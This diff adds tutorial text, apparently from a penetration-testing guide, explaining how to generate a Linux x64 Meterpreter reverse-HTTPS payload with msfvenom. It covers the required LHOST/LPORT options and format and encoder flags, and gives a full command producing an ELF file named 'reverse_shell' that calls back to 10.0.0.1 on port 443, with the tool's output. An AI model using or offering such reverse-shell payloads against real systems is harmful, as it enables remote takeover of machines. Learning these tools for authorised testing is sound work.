@@ -118,3 +118,28 @@ Evasion options for payload/linux/x64/meterpreter_reverse_https:
     Name  Current Setting  Required  Description
     ----  ---------------  --------  -----------
 ```
+
+You can see that the Basic options of LHOST and LPORT are required, to input these options you put the variables in after the the payload before the next argument.   
+`msfvenom -p linux/x64/meterpreter_reverse_https LPORT=443 LHOST=10.0.0.1`   
+
+After this you other options that can be important are:   
+--arch              # Set Architecture
+--platform          # Set Platform   
+-f                  # Set Format   
+-e                  # Set Encoders   
+-o                  # Set Outfile   
+
+All of these options can be used with --list to show valid options.   
+
+For Your Senario -f elf will work.
+
+The final command should look as follows:   
+```console
+root@kali:~# msfvenom -p linux/x64/meterpreter_reverse_https LPORT=443 LHOST=10.0.0.1 -f elf -o reverse_shell
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 1046512 bytes
+Final size of elf file: 1046512 bytes
+Saved as: reverse_shell
+```
